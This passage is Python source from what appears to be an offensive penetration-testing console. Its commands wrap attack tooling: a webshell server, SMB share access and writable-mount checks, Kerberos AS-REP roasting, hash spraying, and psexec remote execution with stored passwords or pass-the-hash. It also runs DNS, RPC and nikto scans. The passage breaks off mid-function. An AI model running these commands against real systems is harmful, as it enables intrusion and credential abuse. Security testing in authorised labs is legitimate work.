    def do_lazywebshell(self, line):
        """Run LazyOwn webshell server.

        This function starts a web server that serves the `lazywebshell.py` script from the `modules` directory on port 8888. The server is run in the background.

        Usage:
            lazywebshell

        :param line: This parameter is not used in this function.
        :type line: str

        :returns: None

        Manual execution:
        1. Start a Python HTTP server with CGI support on port 8888.
        2. The server serves files from the `modules` directory.

        Dependencies:
        - Python 3.x must be installed on the system.
        - The `http.server` module should be available.

        Example:
            To execute the function, simply call `lazywebshell`.

        Note:
            - The server runs in the background, and the output will not be displayed in the terminal.
        """

        print_msg("Running Server in localhost:8888/cgi-bin/lazywebshell.py")
        os.system("cd modules && python3 -m http.server 8888 --cgi &")
        return

    @cmd2.with_category(recon_category)
    def do_getcap(self, line):
        """Retrieve and display file capabilities on the system.

        This function uses the `getcap` command to recursively list capabilities for files starting from the root directory (`/`). The output is filtered to suppress error messages.

        Usage:
            getcap

        :param line: This parameter is not used in this function.
        :type line: str

        :returns: None

        Manual execution:
        1. Run the `getcap -r /` command to list file capabilities recursively from the root directory.
        2. Redirect standard error to `/dev/null` to suppress error messages.
        3. Copy to clipboard the command to appy in the victim machine.
        Dependencies:
        - `getcap` must be installed on the system.

        Example:
            To execute the function, simply call `do_getcap`.

        Note:
            - The command may require elevated permissions to access certain directories and files.
        """
        command = "getcap -r / 2>/dev/null"
        print_msg(f"Try get capabilities {RESET}")
        print_msg(command)
        self.cmd(command)
        copy2clip(command)
        return

    @cmd2.with_category(miscellaneous_category)
    def do_getseclist(self, line):
        """Get the SecLists wordlist from GitHub.

        This function downloads and extracts the SecLists wordlist from GitHub to the `/usr/share/wordlists/` directory.

        Usage:
            getseclist

        :param line: This parameter is not used in this function.
        :type line: str

        :returns: None

        Manual execution:
        1. Navigate to the `/usr/share/wordlists/` directory.
        2. Download the SecLists repository using `wget`.
        3. Extract the downloaded ZIP file.
        4. Remove the ZIP file after extraction.

        Dependencies:
        - `wget` must be installed on the system.
        - `unzip` must be installed on the system.
        - `sudo` must be available for downloading and extracting files.

        Example:
            To execute the function, simply call `getseclist`.

        Note:
            - Ensure that you have the necessary permissions to write to the `/usr/share/wordlists/` directory.
            - If `wget` or `unzip` is not installed, the function will fail.
        """

        print_msg(f"Try to get seclist wordlist [;,;] {RESET}")
        self.cmd("""cd /usr/share/wordlists/ && sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
        && sudo unzip SecList.zip \
        && sudo  rm -f SecList.zip""")

    @cmd2.with_category(scanning_category)
    def do_smbclient(self, line):
        """
        Interacts with SMB shares using the `smbclient` command to perform the following operations:

        1. Checks if `rhost` (remote host) and `lhost` (local host) are assign; if not, an error message is displayed.
        2. If `line` (share name) is provided:
        - Attempts to access the specified SMB share on the remote host using the command: `smbclient -N \\\\{rhost}\\{line}`
        3. If `line` is not provided:
        - Lists available SMB shares on the remote host with the command: `smbclient -N -L \\\\{rhost}`
        4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/share" /mnt/smb`

        :param line: The name of the SMB share to access on the remote host. If not provided, the function will list all available shares.
        :returns: None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        path_cred = "sessions/credentials.txt"
        url = self.params["url"]
        domain = get_domain(url)
        if not check_rhost(rhost):
            return

        if not check_lhost(lhost):
            return

        if not os.path.exists(path_cred):
            if line:

                nargs = len(line.split(" "))
                if nargs == 1:
                    print_msg(f"Try .. smbclient -N \\\\{rhost}\\\\{line} {RESET}")
                    self.cmd(f"smbclient -N \\\\\\\\{rhost}\\\\{line}")
                    return
                if nargs == 2:
                    args = line.split(" ")
                    directorio = args[0]
                    user = args[1]
                    print_msg(f"Try .. smbclient \\\\{rhost}\\\\{directorio} -U {user} {RESET}")
                    self.cmd(f"smbclient \\\\\\\\{rhost}\\\\{directorio} -U {user} ")
                    return

            print_msg(f"Perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
            self.cmd(f"smbclient -N -L \\\\{rhost}\\")
            print_msg(
                f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
            )
            print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')

            return
        else:
            with open(path_cred, "r") as file:
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    command = f"smbclient -L //{domain}/{line} -U '{domain}\\\\{user}'"
                    copy2clip(passwd)
                    print_msg(command)
                    self.cmd(command)
                    print_msg(
                        f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                    )
                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                    return
    @cmd2.with_category(scanning_category)
    def do_smbclient_impacket(self, line):
        """
        Interacts with SMB shares using the `smbclient` command to perform the following operations:

        1. Checks if `rhost` (remote host) and `lhost` (local host) are assign; if not, an error message is displayed.
        2. If `line` (share name) is provided:
        - Attempts to access the specified SMB share on the remote host using the command: `smbclient -N \\\\{rhost}\\{line}`
        3. If `line` is not provided:
        - Lists available SMB shares on the remote host with the command: `smbclient -N -L \\\\{rhost}`
        4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/share" /mnt/smb`

        :param line: The name of the SMB share to access on the remote host. If not provided, the function will list all available shares.
        :returns: None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        path_cred = "sessions/credentials.txt"
        url = self.params["url"]
        domain = get_domain(url)
        if not check_rhost(rhost):
            return

        if not check_lhost(lhost):
            return

        if not os.path.exists(path_cred):
            if line:

                nargs = len(line.split(" "))
                if nargs == 1:
                    print_msg(f"Try .. impacket-smbclient -N \\\\{rhost}\\\\{line} {RESET}")
                    self.cmd(f"impacket-smbclient -N \\\\\\\\{rhost}\\\\{line}")
                    return
                if nargs == 2:
                    args = line.split(" ")
                    directorio = args[0]
                    user = args[1]
                    print_msg(f"Try .. impacket-smbclient \\\\{rhost}\\\\{directorio} -U {user} {RESET}")
                    self.cmd(f"impacket-smbclient \\\\\\\\{rhost}\\\\{directorio} -U {user} ")
                    return

            print_msg(f"Perform this command: impacket-smbclient -N -L \\\\{rhost}\\ {RESET}")
            self.cmd(f"impacket-smbclient -N -L \\\\{rhost}\\")
            print_msg(
                f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
            )
            print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')

            return
        else:
            with open(path_cred, "r") as file:
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    command = f"impacket-smbclient {user}@{rhost}"
                    copy2clip(passwd)
                    print_msg(command)
                    self.cmd(command)
                    print_msg(
                        f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                    )
                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                    return
    @cmd2.with_category(scanning_category)
    def do_smbclient_py(self, line):
        """
        Interacts with SMB shares using the `smbclient.py` command to perform the following operations:

        1. Checks if `rhost` (remote host) and `lhost` (local host) are assign; if not, an error message is displayed.
        2. If `line` (share name) is provided:
        - Attempts to access the specified SMB share on the remote host using the command: `smbclient.py -N \\\\{rhost}\\{line}`
        3. If `line` is not provided:
        - Lists available SMB shares on the remote host with the command: `smbclient.py -N -L \\\\{rhost}`
        4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/share" /mnt/smb`

        :param line: The name of the SMB share to access on the remote host. If not provided, the function will list all available shares.
        :returns: None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        path_cred = "sessions/credentials.txt"
        url = self.params["url"]
        domain = get_domain(url)
        if not check_rhost(rhost):
            return

        if not check_lhost(lhost):
            return

        if not os.path.exists(path_cred):
            print_error(f"You need credentialts use:{GREEN} createcredentials admin:admin")
            return
        else:
            with open(path_cred, "r") as file:
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    command = f"smbclient.py {user}:'{passwd}'@{rhost}"
                    print_msg(command)
                    self.cmd(command)
                    print_msg(
                        f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                    )
                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                    return

    @cmd2.with_category(scanning_category)
    def do_smbmap(self, line):
        """smbmap -H 10.10.10.3 [OPTIONS]
        Uses the `smbmap` tool to interact with SMB shares on a remote host:

        1. Checks if `rhost` (remote host) and `lhost` (local host) are assign; if not, an error message is displayed.
        2. If no `line` (share name or options) is provided:
        - Attempts to access SMB shares on the remote host with a default user `deefbeef` using the command: `smbmap -H {rhost} -u 'deefbeef'`
        3. If `line` is provided:
        - Executes `smbmap` with the specified options or share name using the command: `smbmap -H {rhost} -R {line}`
        4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/documents" /mnt/smb`

        :param line: Options or share name to use with `smbmap`. If not provided, uses a default user to list shares.
        :returns: None"""
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        path_cred = f"{path}/sessions/credentials.txt"
        if not check_rhost(rhost):
            return

        if not check_lhost(lhost):
            return

        if not os.path.exists(path_cred):
            if not line:
                print_msg(f"Try... smbmap -H {rhost} -u 'deefbeef'")
                self.cmd(f"smbmap -H {rhost} -u 'deefbeef'")
                return
            else:
                if line.startswith("hash"):
                    username = input("    [!] Enter a valid username (default: henry.vinson): ") or 'henry.vinson'
                    domain = input(f"    [!] Enter a valid domain (default: {domain}): ") or domain
                    rhost = input(f"    [!] Enter a valid host (default: {rhost}): ") or rhost
                    hashis = get_hash()

                    command = f"smbmap -u {username} -d {domain} -p '{hashis}' -H {rhost}"
                    print_msg(command)
                    self.cmd(command)
                    return
                else:
                    print_msg(f"Try... smbmap -H {rhost} -R {line}")
                    self.cmd(f"smbmap -H {rhost} -R {line}")
                    print_msg(
                        f'exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/documents" /mnt/smb '
                    )
                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                    return
        else:
            path_cred = get_credentials(True)
            try:
                if_execute = input(f"    {GREEN}[?] Do you wanna try exec commands (y/n)") or "n"
            except EOFError:
                if_execute = "n"
            if if_execute == "y":
                execute = " -x "
                command_try = input(f"    {GREEN}[!] Enter the command to try (default: whoami): ") or "whoami"
                execute += command_try
            else:

                if_search =  input(f"    {GREEN}[?] Do you wanna try search files (y/n)") or "n"
                if if_search == "y":
                    execute = " -A "

                    command_try = input(f"    {GREEN}[!] Enter the share for potentially interesting files [default: (xlsx|docx|txt|xml)]: ") or "(xlsx|docx|txt|xml)"
                    execute += f"'{command_try}' -R"
                else:
                    execute = ""

            with open(path_cred, "r") as file:
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")

            if len(execute) == 0:
                if line:
                    command = f"smbmap -u {user} -p {passwd} -H {rhost} -R {line}"
                    copy2clip(passwd)
                    print_msg(command)
                    self.cmd(command)
                    print_msg(
                        f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                    )
                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                    return
                else:
                    command = f"smbmap -u {user} -p {passwd} -H {rhost}"
                    copy2clip(passwd)
                    print_msg(command)
                    self.cmd(command)
                    print_msg(
                        f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                    )
                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                    return
            else:
                command = f"cd sessions && smbmap -u {user} -p {passwd} -d {domain} -H {rhost} {execute}"
                print_msg(command)
                self.cmd(command)
                print_msg(
                    f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                )
                print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                return
        return

    @cmd2.with_category(scanning_category)
    def do_getnpusers(self, line):
        """sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile sessions/users.txt
        Executes the `impacket-GetNPUsers` command to enumerate users with Kerberos pre-authentication disabled.

        1. Checks if the `line` (domain) argument is provided; if not, an error message is displayed, instructing the user to provide a domain.
        2. Executes `impacket-GetNPUsers` with the following options:
        - `-no-pass`: Skips password prompt.
        - `-usersfile sessions/users.txt`: Specifies the file containing the list of users to check.

        :param line: The domain to query. Must be provided in the format `domain.com`. Example usage: `getnpusers domain.com`
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            sudo impacket-GetNPUsers <domain> -no-pass -usersfile sessions/users.txt
        Replace `<domain>` with the actual domain name you want to query."""

        rhost = self.params["rhost"]
        domain = self.params["domain"]
        if not line:
            users = get_users_dic()
            command = f"GetNPUsers.py {domain}/ -no-pass -usersfile {users} -dc-ip {rhost}"
            print_msg(command)
            self.cmd(command)
            command = f"sudo impacket-GetNPUsers {domain}/ -no-pass -usersfile {users} -dc-ip {rhost}"
            print_msg(command)
            self.cmd(command)
        else:
            if line.startswith("hashs"):
                hashes = get_users_dic()
                username = input("   [!] Enter username to sprayhashes (default: admin) ") or 'admin'
                with open(hashes, 'r') as file:
                    hashes = file.readlines()
                    for hash_line in hashes:
                        hash_line = hash_line.strip()
                        if hash_line:
                            command = f'GetNPUsers.py -hashes {hash_line} {domain}/{username} -dc-ip {rhost}'
                            print_msg(command)
                            self.cmd(command)
                            #choice = input("    [!] Continue ? (y/n)") or "n"
                            #if choice == "n":
                            #    return
        return

    @cmd2.with_category(exploitation_category)
    def do_psexec(self, line):
        """
        Executes the Impacket PSExec tool to attempt remote execution on the specified target.

        This function performs the following actions:
        1. Checks if the provided target host (`rhost`) is valid.
        2. If the `line` argument is "pass", it searches for credential files with the pattern `credentials*.txt`
        and allows the user to select which file to use for executing the command.
        3. If the `line` argument is not "pass", it assumes execution without a password (using the current credentials).
        4. Copies the `rhost` IP address to the clipboard for ease of use.

        Parameters:
        line (str): A command argument to determine the action.
                    If "pass", the function searches for credential files and authenticates using the selected file.
                    Otherwise, it executes PSExec without a password using the `rhost` IP.

        Returns:
        None
        """
        rhost = self.params["rhost"]


        if not check_rhost(rhost):
            return

        if line == "pass":
            credentials = get_credentials()
            if not credentials:
                return

            for user, passwd in credentials:
                command = f"impacket-psexec {user}:'{passwd}'@{rhost}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"

            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            command = f"impacket-psexec {user}@{rhost} {hashis}"
            print_msg(command)
            self.cmd(command)
            return
        else:
            command = f"impacket-psexec administrator@{rhost}"
            print_msg(command)
            self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_psexec_py(self, line):
        """
        Executes the Impacket PSExec tool to attempt remote execution on the specified target.

        This function performs the following actions:
        1. Checks if the provided target host (`rhost`) is valid.
        2. If the `line` argument is "pass", it searches for credential files with the pattern `credentials*.txt`
        and allows the user to select which file to use for executing the command.
        3. If the `line` argument is not "pass", it assumes execution without a password (using the current credentials).
        4. Copies the `rhost` IP address to the clipboard for ease of use.

        Parameters:
        line (str): A command argument to determine the action.
                    If "pass", the function searches for credential files and authenticates using the selected file.
                    Otherwise, it executes PSExec without a password using the `rhost` IP.

        Returns:
        None
        """
        rhost = self.params["rhost"]


        if not check_rhost(rhost):
            return

        if line == "pass":
            credentials = get_credentials()
            if not credentials:
                return

            for user, passwd in credentials:
                command = f"psexec.py {user}:'{passwd}'@{rhost}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"

            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            command = f"psexec.py {user}@{rhost} {hashis}"
            print_msg(command)
            self.cmd(command)
            return
        else:
            command = f"psexec.py administrator@{rhost}"
            print_msg(command)
            self.cmd(command)
        return

    @cmd2.with_category(scanning_category)
    def do_rpcdump(self, line):
        """
        Executes the `rpcdump.py` script to dump RPC services from a target host.

        1. Retrieves the target host IP from the `rhost` parameter.
        2. Checks if the `rhost` parameter is valid using `check_rhost()`. If invalid, the function returns early.
        3. Executes the `rpcdump.py` script on port 135 and 593 to gather RPC service information from the target host.

        :param line: This parameter is not used in this command but is included for consistency with other methods.
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            rpcdump.py -p 135 <target_host>
            rpcdump.py -p 593 <target_host>
        Replace `<target_host>` with the IP address or hostname of the target machine.
        """
        rhost = self.params["rhost"]
        if check_rhost(rhost):
            print_msg(f"Try... rpcdump.py -p 135 {rhost}{RESET}")
            self.cmd(f"rpcdump.py -p 135 {rhost}")
            print_msg(f"Try... rpcdump.py -p 593 {rhost}{RESET}")
            self.cmd(f"rpcdump.py -p 593 {rhost}")
        return

    @cmd2.with_category(recon_category)
    def do_dig(self, line):
        """
        Executes the `dig` command to query DNS information.

        1. Retrieves the DNS server IP from the `line` parameter and the target host from the `rhost` parameter.
        2. If either the DNS server or `rhost` is not provided, an error message is printed.
        3. Executes the `dig` command to query the version of the DNS server and additional records.

        :param line: DNS server IP or hostname. Must be provided for the `dig` command.
        :param rhost: Target host for additional `dig` queries.

        :returns: None

        Manual execution:
        To manually run these commands, use the following syntax:
            dig version.bind CHAOS TXT @<dns_server>
            dig any <domain> @<rhost>

        Replace `<dns_server>` with the IP address or hostname of the DNS server, `<domain>` with the target domain, and `<rhost>` with the IP address or hostname of the target machine.
        """

        rhost = self.params["rhost"]
        if not line or not rhost:
            print_error(
                "[-] rhost must be assign or you must pass the dns argument like dig box.htb"
            )
            return
        print_msg(f"Try dig version.bind CHAOS TXT @{line} {RESET}")
        self.cmd(f"dig version.bind CHAOS TXT @{line}")
        print_msg(f"dig any {line} @{rhost}")
        self.cmd(f"dig any {line} @{rhost}")
        return

    @cmd2.with_category(exploitation_category)
    def do_cp(self, line):
        """
        Copies a file from the ExploitDB directory to the sessions directory.

        1. Retrieves the path to the ExploitDB directory and the target file from the `line` parameter.
        2. Copies the specified file from the ExploitDB directory to the `sessions` directory in the current working directory.

        :param line: The relative path to the file within the ExploitDB directory. For example, `java/remote/51884.py`.
        :param exploitdb: The path to the ExploitDB directory. This must be assign in advance or provided directly.

        :returns: None

        Manual execution:
        To manually copy files, use the following syntax:
            cp <exploitdb_path><file_path> <destination_path>

        Replace `<exploitdb_path>` with the path to your ExploitDB directory, `<file_path>` with the relative path to the file, and `<destination_path>` with the path where you want to copy the file.

        For example:
            cp /usr/share/exploitdb/exploits/java/remote/51884.py /path/to/sessions/
        """

        exploitdb = self.params["exploitdb"]
        path = os.getcwd()
        if not line or not exploitdb:
            print_error(
                "exploitdb must be assign, assign assign exploitdb /usr/share/exploitdb/exploits/ or pass the relative directory path show in the ss alias of command searchsploit, like cp java/remote/51884.py to see the ralive path use ex: ss TeamCity -x java/remote/51884.py"
            )
            return
        print_msg(f"Try cp {exploitdb}{line} {path}/sessions/{RESET}")
        os.system(f"cp {exploitdb}{line} {path}/sessions/")
        os.system(f"searchsploit {line} -p")
        return

    @cmd2.with_category(recon_category)
    def do_dnsenum(self, line):
        """
        Performs DNS enumeration using `dnsenum` to identify subdomains for a given domain.

        1. Executes the `dnsenum` command with parameters to specify the DNS server, output file, and wordlist for enumeration.

        :param line: The target domain to perform DNS enumeration on, e.g., `ghost.htb`.
        :param rhost: The DNS server to use for enumeration, e.g., `10.10.11.24`.
        :param dnswordlist: The path to the DNS wordlist file used for subdomain discovery.

        :returns: None

        Manual execution:
        To manually perform DNS enumeration, use the following command:
            dnsenum --dnsserver <dns_server> --enum -p 0 -s 0 -o <output_file> -f <dns_wordlist> <target_domain>

        Replace `<dns_server>` with the DNS server IP, `<output_file>` with the file path to save the results, `<dns_wordlist>` with the path to your DNS wordlist file, and `<target_domain>` with the domain to be enumerated.

        For example:
            dnsenum --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f /path/to/dnswordlist.txt ghost.htb
        """

        rhost = self.params["rhost"]
        dnswordlist = self.params["dnswordlist"]
        if not line or not rhost or not dnswordlist:
            print_error(
                "rhost and dnswordlist must be assign example: assign rhost 10.10.10.10 or you need pass the domain "
            )
            return
        print_msg(
            f"Try ... dnsenum --dnsserver {rhost} --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} {line} {RESET}"
        )
        self.cmd(
            f"dnsenum --dnsserver {rhost} --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} {line}"
        )
        return
    @cmd2.with_category(recon_category)
    def do_dnsmap(self, line):
        """
        Performs DNS enumeration using `dnsmap` to discover subdomains for a specified domain.

        1. Executes the `dnsmap` command to scan the given domain with a specified wordlist.

        :param line: The target domain to perform DNS enumeration on, e.g., `ghost.htb`.
        :param dnswordlist: The path to the wordlist file used for DNS enumeration.

        :returns: None

        Manual execution:
        To manually perform DNS enumeration, use the following command:
            dnsmap <target_domain> -w <dns_wordlist>

        Replace `<target_domain>` with the domain you want to scan and `<dns_wordlist>` with the path to your DNS wordlist file.

        For example:
            dnsmap ghost.htb -w /path/to/dnswordlist.txt
        """

        rhost = self.params["rhost"]
        dnswordlist = self.params["dnswordlist"]
        if not line or not dnswordlist:
            print_error(
                f"dnswordlist must be assign example: assign dnswordlist path/to/wordlist or you need pass the domain {RESET}"
            )
            return
        print_msg(f"    {GREEN}[+] Try ... dnsmap {line} -w {dnswordlist} {RESET}")
        self.cmd(f"dnsmap {line} -w {dnswordlist}")
        return

    @cmd2.with_category(recon_category)
    def do_whatweb(self, line):
        """
        Performs a web technology fingerprinting scan using `whatweb`.

        1. Executes the `whatweb` command to identify technologies used by the target web application.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target web host to be scanned, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform web technology fingerprinting, use the following command:
            whatweb <target_host>

        Replace `<target_host>` with the URL or IP address of the web application you want to scan.

        For example:
            whatweb example.com
        """
        rhost = self.params["rhost"]
        url = self.params["url"]
        if not check_rhost(rhost):
            return


        if not line:
            print_msg(f"Try... whatweb {rhost}{RESET}")
            self.cmd(f"whatweb {rhost}")
        else:
            if line.startswith("ssl"):
                print_msg(f"Try... whatweb {rhost}{RESET}")
                self.cmd(f"whatweb https://{rhost}")
            elif line.startswith("url"):
                print_msg(f"Try... whatweb {url}{RESET}")
                self.cmd(f"whatweb {url}")

    @cmd2.with_category(scanning_category)
    def do_enum4linux(self, line):
        """
        Performs enumeration of information from a target Linux/Unix system using `enum4linux`.

        1. Executes the `enum4linux` command with the `-a` option to gather extensive information from the specified target.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target host for enumeration, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually enumerate information from a Linux/Unix system, use the following command:
            enum4linux -a <target_host>

        Replace `<target_host>` with the IP address or hostname of the target system.

        For example:
            enum4linux -a 192.168.1.10
        """

        if not self.params["rhost"]:
            print_msg("rhost must be assign")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... enum4linux -a {rhost} {RESET}")
        self.cmd(f"enum4linux -a {rhost}")
        return

    @cmd2.with_category(scanning_category)
    def do_nbtscan(self, line):
        """
        Performs network scanning using `nbtscan` to discover NetBIOS names and addresses in a specified range.

        1. Executes the `nbtscan` command with the `-r` option to scan the specified range of IP addresses for NetBIOS information.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The target network range for scanning, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform a NetBIOS scan across a network range, use the following command:
            sudo nbtscan -r <network_range>

        Replace `<network_range>` with the IP address range you want to scan. For example:
            sudo nbtscan -r 192.168.1.0/24
        """

        if not self.params["rhost"]:
            print_error(f"rhost must be assign{RESET}")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... sudo nbtscan -r {rhost}/24 {RESET}")
        self.cmd(f"sudo nbtscan -r {rhost}/24")
        return

    @cmd2.with_category(scanning_category)
    def do_rpcclient(self, line):
        """
        Executes the `rpcclient` command to interact with a remote Windows system over RPC (Remote Procedure Call) using anonymous credentials.

        1. Runs `rpcclient` with the `-U ''` (empty username) and `-N` (no password) options to connect to the target host specified by `rhost`.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The IP address of the remote host to connect to, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually interact with a remote Windows system using RPC, use the following command:
            rpcclient -U '' -N <target_ip>

        Replace `<target_ip>` with the IP address of the target system. For example:
            rpcclient -U '' -N 10.10.10.10
        """

        if not self.params["rhost"]:
            print_error(f"rhost must be assign{RESET}")
            return
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        adomain = domain.split(".")
        machine = adomain[0]
        if not line:
            path_cred = "sessions/credentials.txt"

            if not os.path.exists(path_cred):
                command = f"rpcclient -U '' -N {rhost}"
                print_msg(f"Try... {GREEN} {command} {RESET}")
                self.cmd(command)

            else:
                with open(path_cred, "r") as file:
                    for file_line in file:
                        params = file_line.split(":")
                        username = params[0]
                        password = params[1].replace("\n", "")
                        command = f"rpcclient -U {machine}/{username}%{password}  {rhost}"
                        print_msg(f"Try... {GREEN} {command} {RESET}")
                        self.cmd(command)

        else:

            command = f"rpcclient -U {machine}/{line} {rhost}"
            print_msg(f"Try... {GREEN} {command} {RESET}")
            self.cmd(command)
        return

    @cmd2.with_category(scanning_category)
    def do_nikto(self, line):
        """
        Runs the `nikto` tool to perform a web server vulnerability scan against the specified target host.

        1. Executes `nikto` with the `-h` option to specify the target host IP address.
        2. Installs `nikto` if it is not already installed.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The IP address of the target web server, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform a web server vulnerability scan using `nikto`, use the following command:
            nikto -h <target_ip>

        Replace `<target_ip>` with the IP address of the target web server. For example:
            nikto -h 10.10.10.10
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        if not is_binary_present("nikto"):
            print_warn("Installing nikto...")
            self.cmd("sudo apt install nikto -y")

        options = {
            "ask": input("    [?] Enter whether to ask about submitting updates (yes, no, auto): "),
            "check6": input("    [?] Check if IPv6 is working (yes/no): "),
            "cgidirs": input("    [?] Enter CGI dirs to scan (none, all, or values like '/cgi/ /cgi-a/'): "),
            "config": input("    [?] Enter the config file to use: "),
            "display": input("    [?] Enter display options (1, 2, 3, 4, D, E, P, S, V): "),
            "dbcheck": input("    [?] Check database and key files for syntax errors (yes/no): "),
            "evasion": input("    [?] Enter encoding technique (1-8, A, B): "),
            "followredirects": input("    [?] Follow 3xx redirects (yes/no): "),
            "format": input("    [?] Enter output format (csv, json, htm, nbe, sql, txt, xml): "),
            "host": rhost,
            "id": input("    [?] Enter host authentication (id:pass or id:pass:realm): "),
            "ipv4": input("    [?] Use IPv4 only (yes/no): "),
            "ipv6": input("    [?] Use IPv6 only (yes/no): "),
            "key": input("    [?] Enter client certificate key file: "),
            "list_plugins": input("    [?] List all available plugins (yes/no): "),
            "maxtime": input("    [?] Enter maximum testing time per host (e.g., 1h, 60m, 3600s): "),
            "mutate": input("    [?] Enter mutation options (1-6): "),
            "nointeractive": input("    [?] Disable interactive features (yes/no): "),
            "nolookup": input("    [?] Disable DNS lookups (yes/no): "),
            "nossl": input("    [?] Disable the use of SSL (yes/no): "),
            "noslash": input("    [?] Strip trailing slash from URL (yes/no): "),
            "no404": input("    [?] Disable nikto attempting to guess a 404 page (yes/no): "),
            "option": input("    [?] Override an option in nikto.conf: "),
            "output": input("    [?] Write output to this file ('.' for auto-name): "),
            "pause": input("    [?] Pause between tests (seconds): "),
            "plugins": input("    [?] Enter list of plugins to run (default: ALL): "),
            "port": input("    [?] Enter port to use (default 80): "),
            "rsacert": input("    [?] Enter client certificate file: "),
            "root": input("    [?] Prepend root value to all requests (format: /directory): "),
            "save": input("    [?] Save positive responses to this directory ('.' for auto-name): "),
            "ssl": input("    [?] Force ssl mode on port (yes/no): "),
            "tuning": input("    [?] Enter scan tuning (1-9, a-e, x): "),
            "timeout": input("    [?] Enter timeout for requests (default 10 seconds): "),
            "userdbs": input("    [?] Load only user databases, not the standard databases (all, tests): "),
            "useragent": input("    [?] Override the default useragent: "),
            "until": input("    [?] Run until the specified time or duration: "),
            "url": self.params["url"],
            "usecookies": input("    [?] Use cookies from responses in future requests (yes/no): "),
            "useproxy": input("    [?] Use the proxy defined in nikto.conf, or argument http://server:port: "),
            "version": input("    [?] Print plugin and database versions (yes/no): "),
            "vhost": input("    [?] Enter virtual host (for Host header): "),
            "404code": input("    [?] Ignore these HTTP codes as negative responses (always). Format: '302,301': "),
